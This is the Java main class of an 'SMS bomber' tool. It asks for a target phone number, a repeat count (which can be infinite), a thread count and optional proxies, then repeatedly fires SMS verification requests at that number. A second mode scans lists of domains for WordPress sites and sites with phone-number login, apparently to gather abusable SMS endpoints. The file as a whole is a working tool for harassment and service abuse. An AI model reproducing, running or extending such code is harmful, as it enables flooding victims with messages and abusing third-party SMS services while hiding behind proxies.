package ir.mrsf.smsbomber;

import com.google.gson.Gson;
import ir.mrsf.smsbomber.enums.ScanType;
import ir.mrsf.smsbomber.managers.ConfigManager;
import ir.mrsf.smsbomber.managers.ProxyManager;
import ir.mrsf.smsbomber.utils.FileUtil;
import ir.mrsf.smsbomber.utils.RequestUtil;
import lombok.Getter;

import java.io.IOException;
import java.util.List;
import java.util.Scanner;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

@Getter
public class SMSBomber {
    @Getter
    private static SMSBomber smsBomber;
    private final ProxyManager proxyManager;
    private final ConfigManager configManager;
    private final Gson gson;

    public static void main(String[] args) {
        new SMSBomber();
    }

    public SMSBomber() {
        smsBomber = this;
        this.gson = new Gson();
        this.configManager = new ConfigManager();
        this.proxyManager = new ProxyManager();
        final Scanner scanner = new Scanner(System.in);

        System.out.println("Which one you want (attack or scan): ");
        switch (scanner.nextLine()) {
            case "attack" -> this.attack(scanner);
            case "scan" -> this.scan(scanner);
            default -> System.out.println("Unrecognized command");
        }
    }

    private void scan(Scanner scanner) {
        System.out.println("Input file path: ");
        final String inputFile = scanner.nextLine();

        System.out.println("Output file path: ");
        final String outputFile = scanner.nextLine();

        try {
            System.out.println("Reading domains from: " + inputFile);
            final List<String> domains = FileUtil.readDomains(inputFile);
            System.out.println("Found " + domains.size() + " domains to check");

            System.out.print("Please enter thread count to attack (recommended 20): ");
            final int threadCount = Integer.parseInt(scanner.nextLine());

            System.out.println("Scan wordpress sites or scan sites have phone number login (wordpress or phone): ");
            final String scanType = scanner.nextLine();

            System.out.println(scanType);

            switch (scanType) {
                case "wordpress" -> {
                    final List<String> wordPressDomains = RequestUtil.findSites(5, threadCount,
                            ScanType.wordpress, null, domains);

                    System.out.println("Found " + wordPressDomains.size() + " WordPress sites out of "
                                       + domains.size() + " domains");
                    FileUtil.writeDomains(outputFile, wordPressDomains);
                }
                case "phone" -> {
                    System.out.println("Which words or phrases are you looking for on the site?" +
                                       " (e.g. mobile, phone number, etc). You can enter multiple," +
                                       " separated by space or comma.");
                    final String[] keywords = scanner.nextLine().split(",");

                    final List<String> wordPressDomains = RequestUtil.findSites(5, threadCount,
                            ScanType.phone, keywords, domains);

                    System.out.println("Found " + wordPressDomains.size() + " sites out of "
                                       + domains.size() + " domains");
                    FileUtil.writeDomains(outputFile, wordPressDomains);
                }
                default -> System.out.println("Unrecognized scan type");
            }

        } catch (IOException e) {
            System.err.println("Error: " + e.getMessage());
        }
    }

    @SuppressWarnings("InfiniteLoopStatement")
    private void attack(Scanner scanner) {
        System.out.println("Proxy mode (y or n): ");
        final String proxyMode = scanner.nextLine();

        if (proxyMode.equalsIgnoreCase("y")) {
            System.out.println("Proxy proxyMethod (file or auto): ");
            final String proxyMethod = scanner.nextLine();
            if (proxyMethod.equalsIgnoreCase("file")) {
                System.out.println("Loading proxy file...");
                this.proxyManager.loadFile();
                this.proxyManager.proxyInfo();
            } else {
                System.out.println("Loading proxy list automatically...");
                this.proxyManager.loadAuto();
                this.proxyManager.proxyInfo();
            }
        }

        System.out.println("Please enter the phone number to attack: ");
        final String phone = scanner.nextLine();

        System.out.print("Please enter repeat count to attack (-1 to infinite): ");
        final int repeatCount = scanner.nextInt();

        System.out.print("Please enter thread count to attack (recommended 20): ");
        final int threadCount = scanner.nextInt();
        ExecutorService executor;

        if (repeatCount == -1) {
            executor = Executors.newFixedThreadPool(threadCount);
            while (true) {
                RequestUtil.sendSMSRequest(executor, phone);
            }
        }

        executor = Executors.newFixedThreadPool(threadCount);
        for (int i = 0; i < repeatCount; i++) {
            RequestUtil.sendSMSRequest(executor, phone);
        }

        executor.shutdown();
        try {
            executor.awaitTermination(Long.MAX_VALUE, TimeUnit.NANOSECONDS);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }

        System.out.println("Done");
    }

}
